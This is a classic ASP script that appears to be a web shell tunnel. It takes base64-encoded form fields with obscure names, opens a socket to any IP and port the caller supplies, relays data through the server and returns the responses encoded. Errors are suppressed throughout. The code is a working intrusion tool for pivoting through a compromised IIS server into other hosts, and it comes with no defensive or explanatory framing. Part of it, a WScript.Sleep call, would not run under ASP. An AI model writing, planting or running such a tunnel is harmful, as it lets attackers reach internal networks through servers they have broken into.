<%

On Error Resume Next
Server.ScriptTimeout = 10

Function Base64Decode(ByVal vCode)
    If vCode = "" Then Exit Function
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing: Set oXML = Nothing
End Function

Function Base64Encode(ByVal vBuffer)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = vBuffer
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing: Set oXML = Nothing
End Function

Sub Main(action, target_ip, target_port, dataBuffer)
    If action = "forward" Then
        Dim skt, responseData, retry, maxWait
        
        Set skt = CreateObject("MSWinsock.Winsock") 
        If Err.Number <> 0 Then
            Response.Write "{""status"":""error"",""msg"":""Winsock component not available""}"
            Exit Sub
        End If
        
        skt.RemoteHost = target_ip
        skt.RemotePort = CInt(target_port)
        skt.Connect
        
        retry = 0
        Do While skt.State <> 7 And retry < 30
            WScript.Sleep 100
            retry = retry + 1
        Loop
        
        If skt.State <> 7 Then
            Response.Write "{""status"":""error"",""msg"":""Connect failed""}"
            skt.Close: Set skt = Nothing
            Exit Sub
        End If
        
        If LenB(dataBuffer) > 0 Then
            skt.SendData dataBuffer
        End If
        
        responseData = ""
        Dim chunk, hasData
        retry = 0
        
        Do While retry < 3
            Dim t: t = Timer: Do While Timer < t + 0.05: Loop 
            
            hasData = False
            skt.GetData chunk
            If LenB(chunk) > 0 Then
                responseData = responseData & chunk
                hasData = True
            End If
            
            If hasData And LenB(responseData) > 0 Then
                Exit Do
            End If
            retry = retry + 1
        Loop
        
        skt.Close
        Set skt = Nothing
        
        Response.ContentType = "application/json"
        Response.Write "{""status"":""success"",""data"":""" & Base64Encode(responseData) & """}"
    End If
End Sub

Dim z0, z2, z3, z4, binData
z0 = Base64Decode(Request.Form("z0"))
z2 = Base64Decode(Request.Form("z2"))
z3 = Base64Decode(Request.Form("z3"))
z4 = Request.Form("z4")

binData = Base64Decode(Base64Decode(z4)) 

Call Main(z0, z2, z3, binData)

If Err.Number <> 0 Then Err.Clear

%>